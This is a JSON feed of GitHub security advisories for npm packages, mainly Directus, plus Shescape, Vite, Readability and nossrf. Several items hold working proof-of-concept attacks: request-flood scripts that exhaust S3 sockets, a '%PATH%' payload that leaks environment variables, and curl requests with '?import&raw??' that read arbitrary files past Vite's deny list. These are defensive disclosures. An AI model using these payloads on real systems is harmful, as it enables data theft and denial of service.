{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for JavaScript packages hosted at npmjs.com",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Anpm",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/npm.json",
    "description": "Security Advisory for JavaScript packages hosted at npmjs.com on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The <code>search</code> query parameter allows users with access to a collection to filter items based on fields they do not have permission to view. This allows the enumeration of unknown field contents.</p>\n<h3 id=\"details\">Details</h3>\n<p>The searchable columns (numbers &amp; strings) are not checked against permissions when injecting the <code>where</code> clauses for applying the search query. This leads to the possibility of enumerating those un-permitted fields.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create a collection with a string / numeric field, configure the permissions for the public role to not include the field created</li>\n<li>Create items with identifiable content in the not permitted field</li>\n<li>Query the collection and include the field content in the <code>search</code> parameter</li>\n<li>See that results are returned, even tho the public user does not have permission to view the field content</li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability is a very high impact, as for example Directus instances which allow public read access to the user avatar are vulnerable to have the email addresses, password hashes and potentially admin level access tokens extracted. The admin token and password hash extraction have a caveat, as string fields are only searched with a lower cased version of the search query.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c\">https://github.com/directus/directus/security/advisories/GHSA-7wq3-jr35-275c</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30352\">https://nvd.nist.gov/vuln/detail/CVE-2025-30352</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d\">https://github.com/directus/directus/commit/ac5a9964d9926f20dc063a74cb417dc7bbad676d</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7wq3-jr35-275c\">https://github.com/advisories/GHSA-7wq3-jr35-275c</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7wq3-jr35-275c",
            "title": "[directus] Directus `search` query parameter allows enumeration of non permitted fields",
            "date_modified": "2025-03-26T18:44:25.000Z",
            "date_published": "2025-03-26T18:44:23.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7wq3-jr35-275c"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Since the user status is not checked when verifying a session token a suspended user can use the token generated in session auth mode to access the API despite their status.</p>\n<h3 id=\"details\">Details</h3>\n<p>There is a check missing in <code>verifySessionJWT</code> to verify that a user is actually still active and allowed to access the API. Right now one can extract the session token obtained by, e.g. login in to the app while still active and then, after the user has been suspended continue to use that token until it expires.</p>\n<h3 id=\"poc\">PoC</h3>\n<ul>\n<li>Create an active user</li>\n<li>Log in with that user and note the session cookie</li>\n<li>Suspend the user (and don't trigger an <code>/auth/refresh</code> call, as that invalidates the session</li>\n<li>Access the API with <code>Authorization: Bearer &lt;token&gt;</code></li>\n</ul>\n<h3 id=\"impact\">Impact</h3>\n<p>This weakens the security of suspending users.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/directus/directus/security/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n<li><a href=\"https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771\">https://github.com/directus/directus/commit/ef179931c55b50c110feca8404901d5633940771</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-56p6-qw3c-fq2g\">https://github.com/advisories/GHSA-56p6-qw3c-fq2g</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g",
            "title": "[directus] Suspended Directus user can continue to use session token to access API",
            "date_modified": "2025-03-26T18:30:43.000Z",
            "date_published": "2025-03-26T18:30:43.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-56p6-qw3c-fq2g"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There's some tools that use Directus to sync content and assets.\nSome of those tools use HEAD method, like Shopify, to check the existence of files.\nAlthough, when making many HEAD requests at once, at some point, all assets are being served as 403.</p>\n<h3 id=\"details\">Details</h3>\n<p>When I was investigating this issue, I have found that after the burst of HEAD requests, the amount of <code>sockets</code> held on <a href=\"https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189\">Agent on NodeHttpHandler</a> was always equal to <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89\"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>\n<p>After looking into this <a href=\"https://github.com/aws/aws-sdk-js-v3/issues/6691\">issue on AWS SDK</a> I found that if the <a href=\"https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213\">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href=\"https://github.com/directus/directus/blob/main/api/src/controllers/assets.ts#L233-L238\">seen here</a> the stream is not consumed.</p>\n<p>The <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88\">timeouts set here</a>  had no noticeable effect on tests made.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This can be easily reproduced with the following steps:</p>\n<ul>\n<li>setup AWS S3 storage</li>\n<li>set STORAGE_CLOUD_MAX_SOCKETS: \"50\" (this value is lower than default for easier reproduction)</li>\n<li>upload a file to your project</li>\n<li>run this file (Replace the the file ID with the one you just uploaded):</li>\n</ul>\n<pre><code class=\"language-ts\">import axios from \"axios\";\n\nasync function start() {\n  Array.from({ length: 400 }, (_, i) =&gt; {\n    axios\n      .head(\n        \"http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8\"\n      )\n      .then(() =&gt; console.log(\"✅\"))\n      .catch((e) =&gt;\n        console.log(\"⛔\", e.response?.status || e.code || e.message)\n      );\n  });\n}\n\nstart();\n</code></pre>\n<p>Here's an example:</p>\n<p><a href=\"https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753\">https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5\">https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rv78-qqrq-73m5\">https://github.com/advisories/GHSA-rv78-qqrq-73m5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rv78-qqrq-73m5",
            "title": "[directus] Directus's S3 assets become unavailable after a burst of HEAD requests",
            "date_modified": "2025-03-26T17:20:06.000Z",
            "date_published": "2025-03-26T17:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rv78-qqrq-73m5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>There's some tools that use Directus to sync content and assets.\nSome of those tools use HEAD method, like Shopify, to check the existence of files.\nAlthough, when making many HEAD requests at once, at some point, all assets are being served as 403.</p>\n<h3 id=\"details\">Details</h3>\n<p>When I was investigating this issue, I have found that after the burst of HEAD requests, the amount of <code>sockets</code> held on <a href=\"https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189\">Agent on NodeHttpHandler</a> was always equal to <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89\"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>\n<p>After looking into this <a href=\"https://github.com/aws/aws-sdk-js-v3/issues/6691\">issue on AWS SDK</a> I found that if the <a href=\"https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213\">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href=\"https://github.com/directus/directus/blob/main/api/src/controllers/assets.ts#L233-L238\">seen here</a> the stream is not consumed.</p>\n<p>The <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88\">timeouts set here</a>  had no noticeable effect on tests made.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This can be easily reproduced with the following steps:</p>\n<ul>\n<li>setup AWS S3 storage</li>\n<li>set STORAGE_CLOUD_MAX_SOCKETS: \"50\" (this value is lower than default for easier reproduction)</li>\n<li>upload a file to your project</li>\n<li>run this file (Replace the the file ID with the one you just uploaded):</li>\n</ul>\n<pre><code class=\"language-ts\">import axios from \"axios\";\n\nasync function start() {\n  Array.from({ length: 400 }, (_, i) =&gt; {\n    axios\n      .head(\n        \"http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8\"\n      )\n      .then(() =&gt; console.log(\"✅\"))\n      .catch((e) =&gt;\n        console.log(\"⛔\", e.response?.status || e.code || e.message)\n      );\n  });\n}\n\nstart();\n</code></pre>\n<p>Here's an example:</p>\n<p><a href=\"https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753\">https://github.com/user-attachments/assets/29d65bf0-5637-478f-a215-083c2ded3753</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5\">https://github.com/directus/directus/security/advisories/GHSA-rv78-qqrq-73m5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rv78-qqrq-73m5\">https://github.com/advisories/GHSA-rv78-qqrq-73m5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rv78-qqrq-73m5",
            "title": "[@directus/storage-driver-s3] Directus's S3 assets become unavailable after a burst of HEAD requests",
            "date_modified": "2025-03-26T17:20:06.000Z",
            "date_published": "2025-03-26T17:20:05.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rv78-qqrq-73m5"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When making many malformed transformation requests at once, at some point, all assets are being served as 403.</p>\n<h3 id=\"details\">Details</h3>\n<p>When I was investigating this issue, I have found that after a burst of malformed asset transformation requests, the amount of <code>sockets</code> held on <a href=\"https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189\">Agent on NodeHttpHandler</a> was always equal to <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89\"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>\n<p>After looking into this <a href=\"https://github.com/aws/aws-sdk-js-v3/issues/6691\">issue on AWS SDK</a> I found that if the <a href=\"https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213\">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href=\"https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L184\">seen here</a> the stream is not consumed, because <code>sharp</code> will throw an error on the invalid arguments. For example <code>?height=xyz</code></p>\n<p>The <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88\">timeouts set here</a>  had no noticeable effect on tests made.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This can be easily reproduced with the following steps:</p>\n<ul>\n<li>setup AWS S3 storage</li>\n<li>set STORAGE_CLOUD_MAX_SOCKETS: \"50\" (this value is lower than default for easier reproduction)</li>\n<li>upload a file to your project</li>\n<li>run this file (Replace the the file ID with the one you just uploaded):</li>\n</ul>\n<pre><code class=\"language-ts\">import axios from \"axios\";\n\nasync function start() {\n  Array.from({ length: 400 }, (_, i) =&gt; {\n    axios\n      .get(\n        \"http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8?width=100&amp;height=XYZ\"\n      )\n      .then(() =&gt; console.log(\"✅\"))\n      .catch((e) =&gt;\n        console.log(\"⛔\", e.response?.status || e.code || e.message)\n      );\n  });\n}\n\nstart();\n</code></pre>\n<p>Here's an example:</p>\n<p><a href=\"https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c\">https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx\">https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j8xj-7jff-46mx\">https://github.com/advisories/GHSA-j8xj-7jff-46mx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j8xj-7jff-46mx",
            "title": "[directus] Directus's S3 assets become unavailable after a burst of malformed transformations",
            "date_modified": "2025-03-26T17:19:30.000Z",
            "date_published": "2025-03-26T17:19:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j8xj-7jff-46mx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>When making many malformed transformation requests at once, at some point, all assets are being served as 403.</p>\n<h3 id=\"details\">Details</h3>\n<p>When I was investigating this issue, I have found that after a burst of malformed asset transformation requests, the amount of <code>sockets</code> held on <a href=\"https://github.com/smithy-lang/smithy-typescript/blob/main/packages/node-http-handler/src/node-http-handler.ts#L189\">Agent on NodeHttpHandler</a> was always equal to <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L89\"><code>STORAGE_CLOUD_MAX_SOCKETS</code></a> making it impossible to have new connections causing assets to be inaccessible.</p>\n<p>After looking into this <a href=\"https://github.com/aws/aws-sdk-js-v3/issues/6691\">issue on AWS SDK</a> I found that if the <a href=\"https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L213\">stream is requested</a>, it needs to be consumed otherwise will hang forever. And as can be <a href=\"https://github.com/directus/directus/blob/main/api/src/services/assets.ts#L184\">seen here</a> the stream is not consumed, because <code>sharp</code> will throw an error on the invalid arguments. For example <code>?height=xyz</code></p>\n<p>The <a href=\"https://github.com/directus/directus/blob/main/packages/storage-driver-s3/src/index.ts#L87-L88\">timeouts set here</a>  had no noticeable effect on tests made.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>This can be easily reproduced with the following steps:</p>\n<ul>\n<li>setup AWS S3 storage</li>\n<li>set STORAGE_CLOUD_MAX_SOCKETS: \"50\" (this value is lower than default for easier reproduction)</li>\n<li>upload a file to your project</li>\n<li>run this file (Replace the the file ID with the one you just uploaded):</li>\n</ul>\n<pre><code class=\"language-ts\">import axios from \"axios\";\n\nasync function start() {\n  Array.from({ length: 400 }, (_, i) =&gt; {\n    axios\n      .get(\n        \"http://localhost:8055/assets/e536aa35-3a81-4fa9-b856-3780584d38d8?width=100&amp;height=XYZ\"\n      )\n      .then(() =&gt; console.log(\"✅\"))\n      .catch((e) =&gt;\n        console.log(\"⛔\", e.response?.status || e.code || e.message)\n      );\n  });\n}\n\nstart();\n</code></pre>\n<p>Here's an example:</p>\n<p><a href=\"https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c\">https://github.com/user-attachments/assets/7f5a6f51-1c51-4d4d-aa4f-c4953e91714c</a></p>\n<h3 id=\"impact\">Impact</h3>\n<p>This causes denial of assets for all policies of Directus, including Admin and Public.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx\">https://github.com/directus/directus/security/advisories/GHSA-j8xj-7jff-46mx</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-j8xj-7jff-46mx\">https://github.com/advisories/GHSA-j8xj-7jff-46mx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-j8xj-7jff-46mx",
            "title": "[@directus/storage-driver-s3] Directus's S3 assets become unavailable after a burst of malformed transformations",
            "date_modified": "2025-03-26T17:19:30.000Z",
            "date_published": "2025-03-26T17:19:28.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-j8xj-7jff-46mx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This impact users of Shescape on Windows that explicitly configure <code>shell: 'cmd.exe'</code> or <code>shell: true</code> using any of <code>quote</code>/<code>quoteAll</code>/<code>escape</code>/<code>escapeAll</code>.</p>\n<p>An attacker may be able to get read-only access to environment variables. Example:</p>\n<pre><code class=\"language-javascript\">import * as cp from \"node:child_process\";\nimport { Shescape } from \"shescape\";\n\n// 1. Prerequisites\nconst shescape = new Shescape({\n    shell: \"cmd.exe\",\n    // Or\n    shell: true, // Only if the default shell is CMD\n});\n\n// 2. Payload\nconst payload = '\"%PATH%';\n\n// 3. Usage\nlet escapedPayload;\n\nescapedPayload = shescape.quote(payload);\n// Or\nescapedPayload = shescape.quoteAll([payload]);\n// Or\nescapedPayload = shescape.escape(payload);\n// Or\nescapedPayload = shescape.escapeAll([payload]);\n\n// And (example)\nconst result = cp.execSync(`echo Hello ${escapedPayload}`, options);\n\n// 4. Impact\nconsole.log(result.toString());\n// Outputs \"Hello\" followed by the contents of the PATH environment variable\n</code></pre>\n<p>For Shescape prior to v2.0.0, the <code>options</code> object must have <code>shell: 'cmd.exe'</code> or <code>shell: undefined</code> and <code>interpolation: true</code>.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>This bug has been patched in <a href=\"https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2\">v2.1.2</a> which you can upgrade to now.</p>\n<p>If you are already using v2 of Shescape, no further changes are required. If you are using v1 of Shescape, follow the <a href=\"https://github.com/ericcornelissen/shescape/blob/155b13b4141750203ce71249f1b0fdc638c7a0d0/docs/migration.md\">migration guide</a> to upgrade to v2. There is no plan to release a patch compatible with v1 of Shescape.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>Alternatively, users can remove all instances of % from user input before using Shescape.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Shescape Pull Request <a href=\"https://github.com/ericcornelissen/shescape/pull/1916\">#1916</a></li>\n<li>Shescape commit <a href=\"https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6\">0a81f1e</a></li>\n<li>Shescape release <a href=\"https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2\">v2.1.2</a></li>\n</ul>\n<h3 id=\"for-more-information\">For more information</h3>\n<ul>\n<li>Comment on Pull Request <a href=\"https://github.com/ericcornelissen/shescape/pull/1916\">#1916</a></li>\n<li>Comment on commit <a href=\"https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6\">0a81f1e</a></li>\n<li>Open an issue at <a href=\"https://github.com/ericcornelissen/shescape/issues\">https://github.com/ericcornelissen/shescape/issues</a> (New issue &gt; Question)</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/ericcornelissen/shescape/security/advisories/GHSA-66pp-5p9w-q87j\">https://github.com/ericcornelissen/shescape/security/advisories/GHSA-66pp-5p9w-q87j</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30222\">https://nvd.nist.gov/vuln/detail/CVE-2025-30222</a></li>\n<li><a href=\"https://github.com/ericcornelissen/shescape/pull/1916\">https://github.com/ericcornelissen/shescape/pull/1916</a></li>\n<li><a href=\"https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6\">https://github.com/ericcornelissen/shescape/commit/0a81f1eb077bab8caae283a2490cd7be9af179c6</a></li>\n<li><a href=\"https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2\">https://github.com/ericcornelissen/shescape/releases/tag/v2.1.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-66pp-5p9w-q87j\">https://github.com/advisories/GHSA-66pp-5p9w-q87j</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-66pp-5p9w-q87j",
            "title": "[shescape] Shescape has potential environment variable exposure on Windows with CMD",
            "date_modified": "2025-03-26T14:54:23.000Z",
            "date_published": "2025-03-26T14:54:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-66pp-5p9w-q87j"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Specially crafted titles may have caused a regular expression to excessively backtrack and cause a local denial of service.</p>\n<p>Additional Details are <a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1948833\">available at Bugzilla</a></p>\n<p>Credit: DayShift</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/mozilla/readability/security/advisories/GHSA-3p6v-hrg8-8qj7\">https://github.com/mozilla/readability/security/advisories/GHSA-3p6v-hrg8-8qj7</a></li>\n<li><a href=\"https://github.com/mozilla/readability/commit/1c4d63be3e7344c3dfdf76ebb05fd0d32de93eb3\">https://github.com/mozilla/readability/commit/1c4d63be3e7344c3dfdf76ebb05fd0d32de93eb3</a></li>\n<li><a href=\"https://bugzilla.mozilla.org/show_bug.cgi?id=1948833\">https://bugzilla.mozilla.org/show_bug.cgi?id=1948833</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-3p6v-hrg8-8qj7\">https://github.com/advisories/GHSA-3p6v-hrg8-8qj7</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-3p6v-hrg8-8qj7",
            "title": "[@mozilla/readability] @mozilla/readability Denial of Service through Regex",
            "date_modified": "2025-03-26T14:08:49.000Z",
            "date_published": "2025-03-26T14:08:48.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-3p6v-hrg8-8qj7"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Versions of the package nossrf before 1.0.4 are vulnerable to Server-Side Request Forgery (SSRF) where an attacker can provide a hostname that resolves to a local or reserved IP address space and bypass the SSRF protection mechanism.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-2691\">https://nvd.nist.gov/vuln/detail/CVE-2025-2691</a></li>\n<li><a href=\"https://security.snyk.io/vuln/SNYK-JS-NOSSRF-9510842\">https://security.snyk.io/vuln/SNYK-JS-NOSSRF-9510842</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vm77-mr48-27wj\">https://github.com/advisories/GHSA-vm77-mr48-27wj</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vm77-mr48-27wj",
            "title": "[nossrf] nossrf Server-Side Request Forgery (SSRF)",
            "date_modified": "2025-03-25T16:30:31.000Z",
            "date_published": "2025-03-23T15:30:33.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vm77-mr48-27wj"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href=\"https://vitejs.dev/config/server-options.html#server-host\"><code>server.host</code> config option</a>) are affected.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" &gt; /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    &lt;body&gt;\n      &lt;h1&gt;403 Restricted&lt;/h1&gt;\n      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30208\">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x574-m823-4x7w\">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x574-m823-4x7w",
            "title": "[vite] Vite bypasses server.fs.deny when using ?raw??",
            "date_modified": "2025-03-25T14:00:04.000Z",
            "date_published": "2025-03-25T14:00:02.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x574-m823-4x7w"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>The contents of arbitrary files can be returned to the browser.</p>\n<h3 id=\"impact\">Impact</h3>\n<p>Only apps explicitly exposing the Vite dev server to the network (using <code>--host</code> or <a href=\"https://vitejs.dev/config/server-options.html#server-host\"><code>server.host</code> config option</a>) are affected.</p>\n<h3 id=\"details\">Details</h3>\n<p><code>@fs</code> denies access to files outside of Vite serving allow list. Adding <code>?raw??</code> or <code>?import&amp;raw??</code> to the URL bypasses this limitation and returns the file content if it exists. This bypass exists because trailing separators such as <code>?</code> are removed in several places, but are not accounted for in query string regexes.</p>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-bash\">$ npm create vite@latest\n$ cd vite-project/\n$ npm install\n$ npm run dev\n\n$ echo \"top secret content\" &gt; /tmp/secret.txt\n\n# expected behaviour\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt\"\n\n    &lt;body&gt;\n      &lt;h1&gt;403 Restricted&lt;/h1&gt;\n      &lt;p&gt;The request url &amp;quot;/tmp/secret.txt&amp;quot; is outside of Vite serving allow list.\n\n# security bypassed\n$ curl \"http://localhost:5173/@fs/tmp/secret.txt?import&amp;raw??\"\nexport default \"top secret content\\n\"\n//# sourceMappingURL=data:application/json;base64,eyJ2...\n</code></pre>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w\">https://github.com/vitejs/vite/security/advisories/GHSA-x574-m823-4x7w</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-30208\">https://nvd.nist.gov/vuln/detail/CVE-2025-30208</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4\">https://github.com/vitejs/vite/commit/315695e9d97cc6cfa7e6d9e0229fb50cdae3d9f4</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c\">https://github.com/vitejs/vite/commit/80381c38d6f068b12e6e928cd3c616bd1d64803c</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41\">https://github.com/vitejs/vite/commit/807d7f06d33ab49c48a2a3501da3eea1906c0d41</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca\">https://github.com/vitejs/vite/commit/92ca12dc79118bf66f2b32ff81ed09e0d0bd07ca</a></li>\n<li><a href=\"https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1\">https://github.com/vitejs/vite/commit/f234b5744d8b74c95535a7b82cc88ed2144263c1</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x574-m823-4x7w\">https://github.com/advisories/GHSA-x574-m823-4x7w</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x574-m823-4x7w",
            "title": "[vite] Vite bypasses server.fs.deny when using ?raw??",
            "date_modified": "2025-03-25T14:00:04.000Z",
            "date_published": "2025-03-25T14:00:02.000Z",
            "author": {
                "name": "GitHub",
